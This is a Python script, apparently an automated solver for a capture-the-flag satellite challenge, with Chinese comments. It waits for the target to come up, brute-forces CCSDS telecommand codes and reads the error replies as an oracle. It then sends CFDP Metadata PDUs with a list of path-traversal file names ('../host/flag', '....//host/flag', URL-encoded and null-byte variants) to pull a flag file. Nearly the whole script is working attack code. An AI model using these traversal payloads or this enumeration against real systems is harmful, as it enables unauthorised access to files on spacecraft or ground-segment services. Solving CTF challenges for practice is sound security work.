#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""无人值守全流程：等实例上线 -> 判封装 -> E帧oracle → 命令枚举 → CFDP 穿越 → 抓 flag。
在 UTM 里 tmux 常驻即可，命中直接写 flag.txt。
"""
import os, re, socket, sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from satlib import *

HOST = os.environ.get("SAT_HOST", "127.0.0.1")
PORT = int(os.environ.get("SAT_PORT", "24619"))
HERE = os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(HERE, "hunt.log")
FLAG_RE = re.compile(rb"[A-Za-z0-9_]{2,}\{[^}]{3,7}\}")


def log(m):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), m)
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def flag_check(data):
    m = FLAG_RE.search(data)
    if m:
        with open(os.path.join(HERE, "flag.txt"), "ab") as f:
            f.write(m.group() + b"\n")
        log("*** FLAG FOUND: %s" % m.group().decode())
        return True
    return False


def rt(payload, wait=3.0):
    """一发一收"""
    try:
        s = socket.create_connection((HOST, PORT), timeout=5)
    except Exception:
        return None
    out = b""
    try:
        s.sendall(payload)
        s.settimeout(wait)
        t0 = time.time()
        while time.time() - t0 < wait:
            try:
                d = s.recv(65536)
            except socket.timeout:
                break
            except OSError:
                break
            if not d:
                break
            out += d
    finally:
        try: s.close()
        except Exception: pass
    return out


def wait_live():
    """返回命中的 (mode, kind, 首包)"""
    probes = [(m, k, frame(k, b"", m)) for m in MODES for k in (b"T", b"C", b"F")]
    cycle = 0
    while True:
        cycle += 1
        for mode, kind, p in probes:
            out = rt(p, 2.5)
            if out:
                log("LIVE! mode=%s kind=%s resp=%r" % (mode, kind, out[:300]))
                with open(os.path.join(HERE, "first.bin"), "wb") as f:
                    f.write(out)
                return mode, kind, out
        log("cycle %d: still dead" % cycle)
        time.sleep(15)


def phase_banner(mode):
    """探测是否先要登录/握手"""
    words = [b"HELLO", b"LOGIN", b"AUTH", b"HELP", b"?", b"USER", b"STATUS",
             b"LIST", b"PWD", b"ls", b"cfdp", b"CFDP", b"GET /", b"VER", b"VERSION"]
    for w in words:
        out = rt(frame(b"C", w, mode), 2.0)
        if out:
            log("handshake? %r -> %r" % (w, out[:200]))
            flag_check(out)


def phase_ccsds(mode, apids, fcodes):
    """E帧oracle：畸形/猜测命令，读回错误文本"""
    for apid in apids:
        for fc in fcodes:
            body = ccsds_tc(apid, fc)
            out = rt(frame(b"C", body, mode), 1.8)
            if out:
                log("TC apid=0x%03x fc=0x%02x -> %r" % (apid, fc, out[:240]))
                if flag_check(out):
                    return True
    return False


def phase_cfdp(mode):
    """CFDP Metadata 源文件名穿越（最关键一条）"""
    paths = [
        "/cf/host/flag", "../host/flag", "/cf/station/../host/flag",
        "/cf/station/../../host/flag", "....//host/flag", "/cf//host//flag",
        "/cf/station/./../../host/flag", "..%2fhost%2fflag",
        "/cf/host/flag\x00.txt", "host/flag",
    ]
    for dcode in (0x07, 0x03, 0x04):
        for p in paths:
            for direction in (1, 0):
                md = bytes([dcode, 0x00]) + lv(p.encode()) + lv(b"/cf/station/loot")
                pdu = cfdp_pdu(0, direction=direction, mode=1, data=md, src=1, dst=2, txn=1)
                out = rt(frame(b"F", pdu, mode), 3.0)
                if out:
                    log("CFDP d=0x%02x dir=%d %s -> %r" % (dcode, direction, p, out[:300]))
                    if flag_check(out):
                        return True
    return False


if __name__ == "__main__":
    mode, kind, first = wait_live()
    log("== phase: handshake words ==")
    phase_banner(mode)
    log("== phase: CCSDS 命令枚举 ==")
    if phase_ccsds(mode, range(0, 0x800, 0x40), [0, 1, 2, 3, 0x10, 0x20, 0x40, 0x80, 0xFF]):
        sys.exit(0)
    log("== phase: CFDP 穿越 ==")
    if phase_cfdp(mode):
        sys.exit(0)
    log("== 阶段结束，未命中；回看 hunt.log 里的 E 帧文本继续手工推 ==")
